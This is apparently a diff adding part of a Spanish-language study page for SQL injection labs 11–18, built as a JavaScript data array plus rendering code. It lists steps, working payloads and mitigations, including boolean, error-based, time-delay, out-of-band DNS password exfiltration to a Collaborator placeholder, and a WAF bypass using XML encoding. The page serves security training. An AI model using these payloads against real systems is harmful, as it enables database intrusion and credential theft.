+            {
+                n: 11, nivel: 'Practitioner', tipo: 'Blind Boolean', acc: '#00d4ff', solved: false,
+                title: 'Blind SQL injection with conditional responses',
+                obj: 'Extraer la contraseña del administrador carácter por carácter usando la presencia/ausencia del mensaje "Welcome back" como canal de exfiltración booleana.',
+                tech: 'La BD no retorna datos visibles pero el mensaje "Welcome back" aparece solo si la consulta devuelve filas. Esto permite hacer preguntas booleanas: ¿Es el carácter N de la contraseña "a"? Si aparece el mensaje → sí. Se usa SUBSTRING() con Burp Intruder para automatizar.',
+                steps: ['Interceptar petición con cookie TrackingId', 'Probar boolean: <code>\'AND \'1\'=\'1</code> (aparece mensaje) vs <code>\'AND \'1\'=\'2</code> (no aparece)', 'Confirmar tabla users y usuario administrator', 'Medir longitud de contraseña con LENGTH(password)>N', 'Extraer cada carácter con SUBSTRING(), iterar con Burp Intruder', 'Reconstruir la contraseña completa (20 caracteres)'],
+                payload: "TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a",
+                pexp: '<code>SUBSTRING(password,1,1)</code> extrae el 1er carácter. Se compara con cada posible carácter. Burp Intruder automatiza posición × carácter para reconstruir. El mensaje "Welcome back" confirma acierto.',
+                miti: ['Usar Prepared Statements', 'No usar datos del usuario en cookies que se consultan en BD', 'Mismo mensaje de respuesta independientemente del resultado de la consulta', 'Hashear contraseñas para reducir el impacto de la exfiltración']
+            },
+
+            {
+                n: 12, nivel: 'Practitioner', tipo: 'Blind Error-based', acc: '#00d4ff', solved: false,
+                title: 'Blind SQL injection with conditional errors',
+                obj: 'Explotar errores SQL condicionales en una BD Oracle para inferir la contraseña del administrador, provocando errores de división por cero cuando la condición es verdadera.',
+                tech: 'La app muestra un error personalizado cuando hay un error SQL. Se usa <code>CASE WHEN (condición) THEN TO_CHAR(1/0) ELSE \'\' END</code>: si la condición es verdadera → división por cero → error 500. Si es falsa → cadena vacía → respuesta 200. Esto actúa como canal binario.',
+                steps: ['Confirmar error con comilla simple en TrackingId', 'Confirmar Oracle con: <code>\'||(SELECT \'\' FROM dual)||\'</code>', 'Verificar tabla users existe', 'Probar condición errónea: <code>\'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \'\' END FROM dual)||\'</code>', 'Extraer caracteres con SUBSTR() e Intruder'],
+                payload: "TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'",
+                pexp: '<code>CASE WHEN</code> bifurca la ejecución. Si el carácter es correcto → <code>TO_CHAR(1/0)</code> → error de Oracle → HTTP 500. Si no → cadena vacía → HTTP 200. El código HTTP actúa como bit de información.',
+                miti: ['Usar Bind Variables de Oracle', 'Manejo de errores genérico que siempre devuelva el mismo código HTTP', 'Deshabilitar mensajes de error detallados de BD en producción', 'No incluir datos de sesión del usuario en consultas SQL directas']
+            },
+
+            {
+                n: 13, nivel: 'Practitioner', tipo: 'Error-based visible', acc: '#ff4dd8', solved: true,
+                title: 'Visible error-based SQL injection',
+                obj: 'Explotar mensajes de error SQL detallados que revelan valores de la BD, usando CAST() para forzar un error de conversión de tipos que incluya la contraseña del administrador en el error visible.',
+                tech: 'Cuando la app muestra errores SQL completos, CAST() puede forzar una conversión inválida (string → int) que falla incluyendo el valor intentado en el mensaje de error. Así la contraseña aparece directamente en la pantalla sin métodos iterativos.',
+                steps: ['Añadir comilla simple al TrackingId y observar error SQL detallado', 'Probar: <code>TrackingId=xyz\' AND CAST((SELECT 1) AS int)--</code>', 'Extraer username: <code>TrackingId=xyz\' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</code>', 'Extraer password del error visible', 'Iniciar sesión con las credenciales obtenidas'],
+                payload: "TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
+                pexp: '<code>CAST(string AS int)</code> falla al intentar convertir texto a entero. El motor incluye el valor string que intentó convertir en el mensaje de error visible, exponiendo la contraseña sin necesitar técnicas iterativas.',
+                miti: ['Usar Prepared Statements', 'Deshabilitar display_errors en producción', 'Configurar un manejador de errores genérico para errores de BD', 'Nunca mostrar stack traces ni mensajes de excepción SQL al usuario']
+            },
+
+            {
+                n: 14, nivel: 'Practitioner', tipo: 'Blind Time-based', acc: '#ff4dd8', solved: true,
+                title: 'Blind SQL injection with time delays',
+                obj: 'Provocar un retraso de 10 segundos en la respuesta del servidor para confirmar la existencia de una vulnerabilidad Blind SQLi cuando no hay diferencia en el contenido de la respuesta.',
+                tech: 'Cuando no hay diferencias en contenido ni errores, se pueden usar funciones de retardo temporal. <code>pg_sleep(10)</code> (PostgreSQL) pausa la ejecución 10s. Como la consulta se ejecuta sincrónicamente, el retraso es observable en el tiempo de respuesta HTTP.',
+                steps: ['Interceptar petición con cookie TrackingId', 'Modificar cookie: <code>TrackingId=x\'||pg_sleep(10)--</code>', 'Enviar y observar que la app tarda ~10 segundos', 'El retraso confirma la vulnerabilidad y el tipo de BD (PostgreSQL)'],
+                payload: "TrackingId=x'||pg_sleep(10)--",
+                pexp: '<code>pg_sleep(10)</code> es función específica de PostgreSQL que pausa N segundos. <code>||</code> concatena el resultado (NULL) con el TrackingId. El retraso en la respuesta HTTP confirma ejecución sincrona.',
+                miti: ['Usar Prepared Statements', 'Establecer timeouts estrictos en consultas de BD', 'Revocar EXECUTE de pg_sleep para el usuario de la aplicación', 'Monitorear consultas de larga duración como posible anomalía']
+            },
+
+            {
+                n: 15, nivel: 'Practitioner', tipo: 'Blind Time-based + Info', acc: '#ff4dd8', solved: true,
+                title: 'Blind SQL injection with time delays and information retrieval',
+                obj: 'Combinar retardos de tiempo condicionales con SUBSTRING() para extraer la contraseña del administrador carácter a carácter midiendo el tiempo de respuesta como canal de datos.',
+                tech: '<code>CASE WHEN (condición) THEN pg_sleep(10) ELSE pg_sleep(0) END</code>: si el carácter es correcto la respuesta tarda 10s; si es incorrecto responde inmediatamente. Burp Intruder automatiza las pruebas midiendo tiempos con el plugin "Response Received".',
+                steps: ['Confirmar comparación de tiempos (1=1 → 10s, 1=2 → inmediato)', 'Confirmar usuario administrator existe', 'Medir longitud de contraseña con LENGTH()>N', 'Usar Burp Intruder con payload en posición del carácter', 'Marcar respuestas con tiempo > 9s como correctas', 'Reconstruir contraseña completa (20 caracteres)'],
+                payload: "TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
+                pexp: '<code>%3B</code> = <code>;</code> codificado en URL (separador de sentencias). <code>CASE WHEN</code> bifurca: carácter correcto → delay 10s → respuesta lenta. Incorrecto → delay 0s → respuesta inmediata. El tiempo actúa como canal de 1 bit.',
+                miti: ['Usar Prepared Statements', 'Timeouts estrictos en todas las consultas BD', 'Deshabilitar pg_sleep para el usuario de la app', 'Implementar detección de anomalías en tiempos de respuesta de BD']
+            },
+
+            {
+                n: 16, nivel: 'Practitioner', tipo: 'Out-of-band DNS', acc: '#00d4ff', solved: false,
+                title: 'Blind SQL injection with out-of-band interaction',
+                obj: 'Forzar al servidor de BD a realizar una consulta DNS hacia Burp Collaborator, demostrando capacidad de exfiltración out-of-band cuando no existe retroalimentación visible ni de tiempo.',
+                tech: 'Cuando los canales in-band están bloqueados, Oracle puede combinar SQL con técnicas XML para disparar peticiones HTTP/DNS. <code>EXTRACTVALUE(xmltype(...))</code> con una entidad XML externa (XXE) fuerza al motor a resolver un hostname externo (Burp Collaborator).',
+                steps: ['Aktivar Burp Collaborator y copiar el subdominio asignado', 'Interceptar la petición con cookie TrackingId', 'Inyectar payload UNION+EXTRACTVALUE con el subdominio de Collaborator', 'Clic derecho → "Insert Collaborator payload" en Burp', 'Verificar en Collaborator que se recibió interacción DNS', 'Presencia de DNS confirma la vulnerabilidad'],
+                payload: 'TrackingId=x\'+UNION+SELECT+EXTRACTVALUE(xmltype(\'<?xml version="1.0"?><!DOCTYPE root[<!ENTITY % r SYSTEM "http://COLLABORATOR-SUBDOMAIN/">%r;]>\'),\'/l\')+FROM+dual--',
+                pexp: '<code>EXTRACTVALUE</code> evalúa el XPath sobre el XML. La entidad externa en el DOCTYPE fuerza a Oracle a resolver el hostname en <code>SYSTEM</code>. Burp Collaborator registra la petición DNS entrante.',
+                miti: ['Usar Prepared Statements', 'Firewall de egress: bloquear conexiones salientes desde el proceso de BD', 'Deshabilitar resolución DNS desde procesos de BD', 'Monitorear tráfico de red inusual desde el servidor de BD']
+            },
+
+            {
+                n: 17, nivel: 'Practitioner', tipo: 'Out-of-band Exfil', acc: '#00d4ff', solved: false,
+                title: 'Blind SQL injection with out-of-band data exfiltration',
+                obj: 'Exfiltrar la contraseña del administrador incluyéndola como subdominio en la petición DNS enviada a Burp Collaborator, recuperándola desde los logs del servidor DNS.',
+                tech: 'Extiende Lab 16: en lugar de solo disparar un DNS, se concatena la contraseña como parte del subdominio del host. Oracle resuelve el DNS con el nombre <code>[password].collaborator.net</code>. Collaborator registra el subdominio, revelando la contraseña exfiltrada.',
+                steps: ['Activar Burp Collaborator y obtener subdominio', 'Construir payload con <code>||(SELECT password FROM users WHERE username=\'administrator\')||</code> en el hostname de la entidad XXE', 'Enviar la petición', 'Revisar en Collaborator las interacciones DNS recibidas', 'El subdominio del DNS = contraseña del administrador', 'Iniciar sesión con la contraseña obtenida'],
+                payload: "TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root[<!ENTITY % r SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-SUBDOMAIN/\">%r;]>'),'/l')+FROM+dual--",
+                pexp: 'La contraseña se concatena como parte del hostname DNS. Oracle resuelve <code>[password].collaborator.net</code>. Collaborator captura el nombre completo del host en el DNS lookup, revelando el dato exfiltrado sin canal in-band.',
+                miti: ['Usar Prepared Statements', 'Bloquear toda conexión saliente del servidor de BD con firewall', 'Aislar el servidor de BD en red sin acceso a internet', 'Monitorear peticiones DNS salientes desde la infraestructura del servidor']
+            },
+
+            {
+                n: 18, nivel: 'Practitioner', tipo: 'Filter Bypass / XML', acc: '#00d4ff', solved: false,
+                title: 'SQL injection with filter bypass via XML encoding',
+                obj: 'Evadir un WAF que bloquea payloads SQL obvios usando codificación de entidades XML para ofuscar el payload en el campo storeId de la función de stock check.',
+                tech: 'La app envía datos en XML para check de stock. El WAF detecta patrones SQL en texto plano. Al codificar el payload con entidades hexadecimales/decimales XML (Hackvertor), el WAF las ve como XML válido mientras el parser de la app las decodifica antes de pasarlas a la BD.',
+                steps: ['Identificar que stock check usa XML con productId y storeId', 'Enviar POST /product/stock a Burp Repeater', 'Probar UNION directo → bloqueado por WAF', 'Instalar extensión Hackvertor en Burp', 'Seleccionar payload → Extensions → Hackvertor → Encode → hex_entities', 'Enviar payload codificado → bypasea WAF', 'Concatenar user||~||password en columna única y leer respuesta'],
+                payload: "<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>",
+                pexp: 'Hackvertor codifica el payload como entidades hex XML (ej: U=&#x55;). El WAF analiza el XML codificado y no detecta el patrón SQL. La app decodifica las entidades antes de ejecutar, entregando el SQL normal a la BD.',
+                miti: ['Usar Prepared Statements en todos los endpoints, incluyendo los que reciben XML', 'Normalizar y decodificar inputs ANTES de aplicar reglas del WAF', 'No confiar exclusivamente en WAF como la única defensa', 'Configurar el parser XML con restricciones anti-XXE']
+            }
+        ];
+
+        // Color accent per level
+        function acc(lab) { return lab.acc }
+
+        function renderList() {
+            document.getElementById('ll').innerHTML = D.map(l => `
+    <div class="lc${l.solved ? ' solved' : ''}" style="--acc:${acc(l)}">
+      <div class="lc-num"><small>LAB</small><b>${l.n}</b></div>
+      <div class="lc-body">
+        <div class="lc-title">${l.title}</div>
+        <div class="lc-chips">
+          <span class="chip ${l.nivel === 'Apprentice' ? 'appr' : 'prac'}">${l.nivel}</span>
+          <span class="chip">${l.tipo}</span>
+        </div>
+        <button class="lc-btn" onclick="openLab(${l.n})">Ver laboratorio <i class="fas fa-arrow-right"></i></button>
+      </div>
+      <div class="lc-right">
+        <div class="lc-status ${l.solved ? 'ok' : ''}">
+          <i class="fas fa-${l.solved ? 'check-circle' : 'lock'}"></i>
+          ${l.solved ? 'SOLVED' : 'PENDING'}
+        </div>
+      </div>
+    </div>`).join('');
+        }
+
+        let curTab = 0;
+        function tab(i) {
+            document.querySelectorAll('.tab').forEach((t, j) => t.classList.toggle('on', j === i));
+            document.querySelectorAll('.tp').forEach((p, j) => p.classList.toggle('on', j === i));
+            curTab = i;
+        }
+
+        function openLab(n) {
+            const l = D[n - 1];
+            document.getElementById('dn').textContent = n;
+            document.getElementById('dt').textContent = l.title;
+            document.getElementById('dch').innerHTML = `
+    <span class="chip ${l.nivel === 'Apprentice' ? 'appr' : 'prac'}">${l.nivel}</span>
+    <span class="chip">${l.tipo}</span>
+    ${l.solved ? '<span class="chip" style="border-color:rgba(0,255,136,.4);color:#00ff88;background:rgba(0,255,136,.08);">✓ SOLVED</span>' : ''}`;
+            const ds = document.getElementById('ds');
+            ds.className = 'd-status' + (l.solved ? ' ok' : '');
+            document.getElementById('dsi').className = 'fas fa-' + (l.solved ? 'check-circle' : 'lock');
+            document.getElementById('dst').textContent = l.solved ? 'Lab resuelto ✓' : 'Pendiente de resolver';
+            document.getElementById('obj').innerHTML = l.obj;
+            document.getElementById('tech').innerHTML = l.tech;
+            document.getElementById('steps').innerHTML = l.steps.map((s, i) => `
+    <div class="step-card"><div class="step-n">${i + 1}</div><div class="step-t">${s}</div></div>`).join('');
+            document.getElementById('pay').textContent = l.payload;
+            document.getElementById('pexp').innerHTML = l.pexp;
+            document.getElementById('miti').innerHTML = l.miti.map(m => `
+    <div class="mit-item"><i class="fas fa-shield-alt"></i><span>${m}</span></div>`).join('');
+            tab(0);
+            document.getElementById('vl').classList.remove('on');
+            document.getElementById('vd').classList.add('on');
+            window.scrollTo(0, 0);
+        }
+
+        function back() {
+            document.getElementById('vd').classList.remove('on');
+            document.getElementById('vl').classList.add('on');
+            window.scrollTo(0, 0);
+        }
+
+        function copyPay() {
+            const txt = document.getElementById('pay').textContent;
+            navigator.clipboard.writeText(txt).then(() => {
+                const btn = document.querySelector('.copy-btn');
+                btn.classList.add('copied');
+                btn.innerHTML = '<i class="fas fa-check"></i>';
+                setTimeout(() => { btn.classList.remove('copied'); btn.innerHTML = '<i class="fas fa-copy"></i>'; }, 1500);
+            });
+        }
+
+        function dlPDF() {
+            const btn = document.getElementById('bpdf'), nav = document.querySelector('.neon-nav'), ft = document.querySelector('footer');
+            btn.textContent = 'Generando...'; btn.disabled = true;
+            nav.style.display = 'none'; ft.style.display = 'none';
+            html2pdf().set({
+                margin: [8, 8, 8, 8], filename: 'SQLInjection_Labs.pdf', image: { type: 'jpeg', quality: .95 },
+                html2canvas: { scale: 2, useCORS: true, scrollY: 0 }, jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' },
+                pagebreak: { mode: ['avoid-all', 'css', 'legacy'] }
+            })
+                .from(document.getElementById('vl')).save().then(() => {
+                    btn.innerHTML = '<i class="fas fa-file-pdf"></i> DESCARGAR PDF'; btn.disabled = false;
+                    nav.style.display = ''; ft.style.display = '';
+                });
+        }
+
+        renderList();
+    </script>
+</body>
+
+</html>
